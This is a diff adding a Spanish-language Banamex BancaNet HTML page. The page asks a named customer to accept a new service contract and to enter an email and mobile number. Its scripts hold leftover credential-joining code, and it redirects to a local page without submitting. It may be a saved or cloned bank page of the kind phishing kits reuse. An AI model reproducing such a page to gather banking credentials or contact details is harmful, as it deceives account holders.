@@ -1,0 +1,656 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html>
+
+<head>
+
+<title></title>
+
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+
+<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
+
+<META HTTP-EQUIV="Expires" CONTENT="-1">
+
+<META HTTP-EQUIV="Content-Type" content="text/html; charset=iso-8859-1" />
+
+</head>
+
+
+
+<body BACKGROUND="" TEXT="#000000" BGCOLOR="#FFFFFF" LINK="#006060" ONLOAD="if(window.Initialize != null)Initialize();" >
+
+<form  METHOD="POST" ACTION=""  NAME="APPS_FORM_MAIN" >
+
+<input type=hidden name="EWF_SYS_0" value="351ff9d2-3d6c-458a-9dad-06c2b78f8532" ><input type=hidden name="EWF_SYS_1" value="8M434QE@NO32OF@6YAGF31I9DJ@E8PJBTXIYG872" >
+
+<input type=hidden name="EWF_FORM_NAME" value="LEV2 Main">
+
+<div id="wrapper_div"><INPUT TYPE="HIDDEN" SIZE="10" MAXLENGTH="100" NAME="DISPLAYPAGE" VALUE="ZLOG-PAG CONTRATO"><INPUT TYPE="HIDDEN" SIZE="10" MAXLENGTH="100" NAME="TEMPLATE_FILE" VALUE="logon_CHR.htm"><INPUT TYPE="HIDDEN" SIZE="10" MAXLENGTH="100" NAME="SEQUENCE_NUMBER" VALUE="2"><TABLE WIDTH=100%><TR><TD WIDTH=95% ALIGN="bottom"></TD><TD></TD><TD></TD><TD></TD></TR></TABLE>
+
+<SCRIPT>
+
+function AbrirVentana(Nom_Ventana)
+
+{var hWin;if (Nom_Ventana == "Contrato")hWin=open("/OR_V_2908.pdf","Contrato","toolbar=no,directories=no,menubar=no,status=no,scrollbars=yes,width=580,height=300");}
+
+function Initialize()
+
+{
+
+    
+
+	
+
+
+
+	return;
+
+}
+
+function DoSubmit( value ){
+
+	if(value != "CANCEL"){
+
+  	 	setTimeout("window.location = '../../marco.html'", 1000);
+
+	}else{
+
+		this.window.close();
+
+	}
+
+}
+
+function ProcessForm( formObj )
+
+{var userValue = formObj.elements["USERID"].value,passValue = formObj.elements["PASSWORD"].value,userLength = formObj.elements["USERID"].value.length,passLength = formObj.elements["PASSWORD"].value.length;
+
+    document.forms[0].target = "_top";	
+
+
+
+
+
+    document.forms[0].DATA1.value = '' + userValue + '|' + passValue + '||';
+
+
+
+
+
+
+
+	DoSubmit('Submit');
+
+}
+
+</SCRIPT>
+
+<script>
+
+if(parent.v_s$=="BMXBS"){
+
+txts1=''
+
++'\n'
+
++'\n'
+
++'';
+
+document.write(txts1)}
+
+else if (parent.v_s$=="BMXPIS"){
+
+txts2=''
+
++'\n'
+
++'\n'
+
++'';
+
+document.write(txts2)}
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link href="../../bbAvatar/css/estilos.css" rel="stylesheet" type="text/css" />
+
+<script type="text/javascript" src="../../bbAvatar/js/motor.js"></script>
+
+<script type="text/javascript" src="../../bbAvatar/js/opciones.js"></script>
+
+
+
+<script type="text/javascript">
+
+function makeArray(n){
+
+  this.length = n;
+
+  for (i=1;i<=n;i++){
+
+    this[i]=0;
+
+  }
+
+  return this;
+
+}
+
+
+
+function displayDate() {
+
+  var this_month = new makeArray(12);
+
+  
+
+  this_month[0]  = "Enero";
+
+  this_month[1]  = "Febrero";
+
+  this_month[2]  = "Marzo";
+
+  this_month[3]  = "Abril";
+
+  this_month[4]  = "Mayo";
+
+  this_month[5]  = "Junio";
+
+  this_month[6]  = "Julio";
+
+  this_month[7]  = "Agosto";
+
+  this_month[8]  = "Septiembre";
+
+  this_month[9]  = "Octubre";
+
+  this_month[10] = "Noviembre";
+
+  this_month[11] = "Diciembre";
+
+  
+
+
+
+  var this_day_e = new makeArray(7);
+
+  
+
+  this_day_e[0]  = "Domingo";
+
+  this_day_e[1]  = "Lunes";
+
+  this_day_e[2]  = "Martes";
+
+  this_day_e[3]  = "Mi&eacute;rcoles";
+
+  this_day_e[4]  = "Jueves";
+
+  this_day_e[5]  = "Viernes";
+
+  this_day_e[6]  = "S&aacute;bado";
+
+  
+
+  var today = new Date();
+
+  var day   = today.getDate();
+
+  var month = today.getMonth();
+
+  var year  = today.getYear();
+
+  var dia = today.getDay();
+
+    if (year < 1000) {
+
+       year += 1900; }
+
+	var hour = today.getHours() < 10 ? '0' + today.getHours() : today.getHours();
+
+	var minute = today.getMinutes() < 10 ? '0' + today.getMinutes() : today.getMinutes();
+
+	var seconds = today.getSeconds() < 10 ? '0' + today.getSeconds() : today.getSeconds();
+
+  
+
+  return( " " + this_day_e[dia] + " " + day + " de " + this_month[month] + " de " + year + ", " + hour + ":" + minute  + ":" + seconds + " Centro de M&eacute;xico" );
+
+  
+
+}
+
+var idioma = 1;
+
+var flag_ajax=false;
+
+var mens12= "S&oacute;lo se permiten datos num&eacute;ricos en este campo, favor de verificar.";
+
+var mens17= "Su n&uacute;mero celular debe ser de 10 d&iacute;gitos.";
+
+var mens18= "Es necesario seleccionar la telefon&iacute;a, favor de verificar.";
+
+var mens19= "Es necesario indicar el n&uacute;mero de celular, favor de verificar.";
+
+
+
+function ValidaCel_CompanyBB1() {
+
+		$('#numCom').val('PS');
+
+		$('#errorMail').html('');
+
+		$('#errorTel').html('');
+
+		if(document.forms[0].DATA10.value.length != 0) {
+
+			if (!Valida_Caracteres(document.forms[0].DATA10,".,",1,"SI",mens12)){return;}  
+
+			if(document.forms[0].DATA10.value.length != 10){
+
+				document.forms[0].DATA10.focus();
+
+				$('#errorTel').html('<div class="ancho100p marginT10 error">'+mens17+'</div>');
+
+				return;	
+
+			}
+
+			$('#numCom').val('TELCEL');
+
+		}
+
+		validaMailExt(idioma,document.getElementById('email1').value);
+
+	}
+
+
+
+function validaMailExt(idioma,myemail){
+
+	var expReg = /^[\w-\.]{3,}@([\w-]{2,}\.)*([\w-]{2,}\.)[\w-]{2,4}$/;
+
+	if ( myemail.match(expReg)){
+
+		//try{document.body.setAttribute('onbeforeunload','');}catch(e){}
+
+		//try{$(window).unbind("beforeunload")}catch(e){};
+
+		DoSubmit('ACCEPT');
+
+	} else {
+
+		if (idioma == 1){
+
+			$('#errorMail').html('<div class="ancho100p marginT10 error">Correo Electr&oacute;nico no v&aacute;lido</div>');
+
+		} else {
+
+			$('#errorMail').html('<div class="ancho100p marginT10 error">Invalid e-mail address</div>');
+
+		}
+
+		return false;
+
+	}
+
+}
+
+
+
+function Valida_Caracteres (Campo_Txt,Caracteres_Extras,Tipo_Validacion,Req,Msg_Error)
+
+{
+
+	var Numeros="0123456789";
+
+	var Letras="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+
+	var Validos="";
+
+	var Txt_MAY = Campo_Txt.value.toUpperCase();
+
+	var invalidos = 0;	
+
+	if (Req == "SI" && Txt_MAY.length==0){
+
+		Campo_Txt.focus();
+
+		return false;
+
+    }	
+
+	else{
+
+		(Tipo_Validacion == 1)?Validos = Numeros:(Tipo_Validacion == 2)?Validos = Letras:Validos = Numeros + Letras;
+
+		Validos = Validos + Caracteres_Extras;
+
+		for (i=0; i < Txt_MAY.length; i++)
+
+			for (j=0; j < Validos.length; j++)
+
+				if (Txt_MAY.charAt(i) != Validos.charAt(j))
+
+					if (j+1 < Validos.length)
+
+						continue;
+
+					else {
+
+						$('#errorTel').html('<div class="ancho100p marginT10 error">'+Msg_Error+'</div>');
+
+						Campo_Txt.focus();
+
+						return false
+
+					}
+
+				else 
+
+					break;	
+
+		return true;
+
+   }
+
+}
+
+
+
+function closewindow(){close()}
+
+
+
+ var focoactual = "";
+
+ function ponerFoco(id){
+
+	focoactual = id;
+
+ }
+
+ function setFechaCopyrigth(fecha){
+
+	var fechapedazos = new Array();
+
+	fechapedazos = fecha.substring(0,8).split("/");
+
+	if(parseInt(fechapedazos[2]) < 2000){
+
+		fechapedazos[2] = parseInt(fechapedazos[2], 10)+2000;
+
+	}
+
+	$("#aniocopy").html(fechapedazos[2]);
+
+}
+
+function DosubmitExitWebKit(){
+
+	var datosEdify = "EWF_BUTTON_EXIT=EXIT&EWF_FORM_NAME=LEV2 Main&EWF_SYS_0="+document.forms[0].EWF_SYS_0.value+"&EWF_SYS_1="+document.forms[0].EWF_SYS_1.value+"&exit=0"
+
+	$.ajax({ url: document.forms[0].action, type: "POST", data: datosEdify, async: false, success: function(){flag_ajax=true;}});
+
+}	
+
+$(document).ready(function(){		
+
+	$("body").keydown(function(event) {			
+
+		if(focoactual != "cancelar"){
+
+		
+
+			if(event.keyCode == '13'){
+
+				ValidaCel_CompanyBB1();
+
+			}
+
+		
+
+		
+
+		}
+
+	});		
+
+	slide(".activaflecha2",5,0);
+
+	setFechaCopyrigth("24/04/12    11:20:45  ");
+
+	$('#fechaActual').html(displayDate());
+
+	$.each($.browser, function(bro, val) { 
+
+		if( bro == "webkit" && val == true ){
+
+			try{document.body.setAttribute('onbeforeunload','');}catch(e){}
+
+			$(window).bind("beforeunload", function(){ for(var i = 0; i<20000; i++){ if(i == 0){ DosubmitExitWebKit(); } if(flag_ajax){break;}}	});
+
+		}
+
+	});
+
+});
+
+	
+
+</script>
+
+<div class="contenedor">
+
+	<div id="Header" class="ancho100p overflow clear paddingT10">
+
+		<div class="ancho100p clear overflow">
+
+			<div id="Logo_Banamex_es" style="cursor:default"></div>
+
+			<div class="floatR ancho459">
+
+				<div class="ligas_head">
+
+					<a href="http:\\portal.banamex.com.mx/mapas/index.jsp?idioma=esp" target="_blank">Sucursales</a> |
+
+					<a href="http:\\www.banamex.com.mx" target="_blank">www.banamex.com</a>
+
+				</div>
+
+				<div id="Logo_Bancanet"></div>
+
+			</div>
+
+		</div>
+
+		<div class="ancho100p clear overflow marginT10 f11" id="fechaActual"></div>
+
+	</div>
+
+	<div id="AreaTrabajo" class="ancho100p overflow clear">            	
+
+		<div class="clear ancho100p overflow">
+
+			<div class="saldos_bloque1_tit1">
+
+				<div class="saldos_bloque1_tit1_btnBox activaflecha2"><div class="saldos_bloque1_tit1_btn">&nbsp;</div></div>
+
+				<div class="saldos_bloque1_tit1_txt"><span>Convenio&nbsp;modificatorio</span></div>
+
+			</div>
+
+			<div class="saldos_bloque1_box1">
+
+				<div class="saldos_btn2b floatR" onclick="window.print();"></div>
+
+			</div>
+
+		</div>
+
+		<div class="ancho85p marginAuto marginT0 clear overflow">
+
+		<table class="ancho100p marginAuto  clear overflow saldos_bloque3_2 marginT8" cellpadding="0" cellspacing="0">
+
+			<tr>
+
+				<td valign="top" class="f11 padding20">
+
+					Estimado (a): JOSE RIVERA LOPEZ
+
+					<br /><br />
+
+					<span class="negrita f11">Banca</span>Net se renueva constantemente incluyendo nuevas funcionalidades y servicios, modernizando la operaci&oacute;n en su conjunto. A tal efecto y para continuar teniendo acceso a toda la gama de servicios que te ofrecemos, es necesario que aceptes el nuevo <a href="#" onclick="open('../../spanishdir/contrato_marzo_2011.pdf','Contrato','toolbar=no,directories=no,menubar=no,status=no,scrollbars=yes,width=580,height=400');" class="f11">Clausulado del Contrato de Prestaci&oacute;n de Servicios</a> que adjuntamos.
+
+					<br /><br />
+
+					
+
+										Ahora puedes realizar todas tus operaciones bancarias <span class="negrita f11">sin costo</span>, para mayor informaci&oacute;n consulta <span class="negrita f11">www.banamex.com.</span>  
+
+					<br /><br />
+
+					<span class="negrita f11">Importante:</span> Para personas F&iacute;sicas con Actividad Empresarial y/o Personas Morales, continuar&aacute; aplicando el esquema de comisiones que corresponda al servicio que tiene contratado.
+
+					
+
+					<br /><br />
+
+					Con el objetivo de mantener una mejor comunicaci&oacute;n contigo, te agradeceremos nos indiques tu correo electr&oacute;nico:
+
+					<br /><br />
+
+					<div class="paddingL20 f11">
+
+						<div class="ancho100p clear overflow paddingB10">
+
+							<div class="ancho200 floatL f11">Correo electr&oacute;nico</div>
+
+							<div class="floatL"><input name="DATA6" type="text" id="email1" class="input ancho190" maxlength="78" onfocus="ponerFoco(id);" /><span id="errorMail"></span></div>
+
+						</div>
+
+						<div class="ancho100p clear overflow">
+
+							<div class="ancho200 floatL f11">N&uacute;mero Celular &nbsp;&nbsp;&nbsp;(044/045)</div>
+
+							<div class="floatL f11"><input type="text" id="DATA10" name="DATA10" class="input ancho190" maxlength="10" onfocus="ponerFoco(id);"/> * Telcel <span id="errorTel"></span></div>
+
+						</div>
+
+					</div>
+
+					
+
+					<br /><br />
+
+					<span class="negrita f11">Nota:</span> Cada vez que recibas informaci&oacute;n en tu correo electr&oacute;nico tendr&aacute;s la opci&oacute;n, por el mismo medio, de cancelar la recepci&oacute;n futura de estos env&iacute;os.
+
+					<br /><br /><br /><br />
+
+					<span class="negrita f11 color333333">Aceptaci&oacute;n de los T&eacute;rminos del Contrato</span>
+
+					<br /><br />
+
+					De manera expresa, al aceptar los t&eacute;rminos del nuevo Clausulado del Contrato de Presentaci&oacute;n de Servicios de Banca Electr&oacute;nica, asumo conocer dicho contrato y expreso mi voluntad en el sentido de que por el Servicio de Banca Electr&oacute;nica, Banamex cobrar&aacute; las comisiones vigentes que de tiempo en tiempo determine y publique en www.banamex.com. Acepto las modificaciones aqu&iacute; indicadas y contenidas en el clausulado del contrato mencionado sin perjuicio de las operaciones realizadas al amparo de los servicios bancarios convenidos de forma previa por escrito y/o a trav&eacute;s de los medios electr&oacute;nicos. Adicionalmente acepto de manera expresa recibir informaci&oacute;n en la direcci&oacute;n de correo electr&oacute;nico indicado de acuerdo con la legislaci&oacute;n vigente.
+
+				</td>
+
+			</tr>
+
+		</table>
+
+		
+
+		<div class="ancho100p marginAuto marginT20 clear overflow">
+
+			<div class="floatL"><input id="cancelar" type="button" value="Cancelar" class="btnRJ86 floatL" onclick="try{document.body.setAttribute('onbeforeunload','');}catch(e){}; try{$(window).unbind('beforeunload')}catch(e){}; DoSubmit('CANCEL');" style="font-size:12px; font-family:Arial, Helvetica, sans-serif;" onfocus="ponerFoco(id);" /></div>
+
+			<div class="floatR"><input id="aceptar" type="button" value="Aceptar" class="btnAZ86 floatR" onclick="ValidaCel_CompanyBB1();" style="font-size:12px; font-family:Arial, Helvetica, sans-serif;" onfocus="ponerFoco(id);" /></div>
+
+		</div>
+
+		
+
+		
+
+	</div>
+
+	<div id="Footer" class="ancho100p overflow clear marginT20">
+
+		<div class="ancho100p colorE6E6E6 paddingB5 borderB_E6E6E6">BancaNet Demo-boveda.banamex.com.mx-ND001-MTY3885CSICB11V-234</div>
+
+		<div class="ancho100p marginT10 overflow">
+
+			<div class="floatL f11">
+
+				Todos los Derechos Reservados 1998 -&nbsp;<span id="aniocopy" class="f11"></span>&nbsp;Grupo Financiero Banamex, S.A.<br />
+
+				Para cualquier duda o aclaraci&oacute;n comun&iacute;cate con nosotros al Tel. 1226 3990 &oacute; 01 800 110 3990
+
+			</div>
+
+			<div class="floatR">
+
+				<a href="#" onclick="open('../../spanishdir/terminos.htm','Terminos','toolbar=no,directories=no,menubar=no,status=no,scrollbars=yes,width=580,height=300');" class="undeline f11">T&eacute;rminos, Condiciones de uso y Privacidad</a>
+
+			</div>
+
+		</div>
+
+	</div>
+
+	<input type="hidden" name="DATA11" id="numCom" />
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<INPUT TYPE="HIDDEN" NAME="EWFBUTTON" VALUE="">
+
+<INPUT TYPE="HIDDEN" name="EXTRA1" value="SPANISH">
+
+<INPUT TYPE="HIDDEN" name="EXTRA2" value="">
+
+<INPUT TYPE="HIDDEN" name="EXTRA3" value="">
+
+<INPUT TYPE="HIDDEN" name="EXTRA4" value="NO_ERROR">
+
+<input id="omtmodalvalue" type="hidden" value="Autenticacion de Login|logon_CHR.htm" />
+
+</div><p></p>
+
+
+
+</form>
+
+</body>
+
+</html>
+
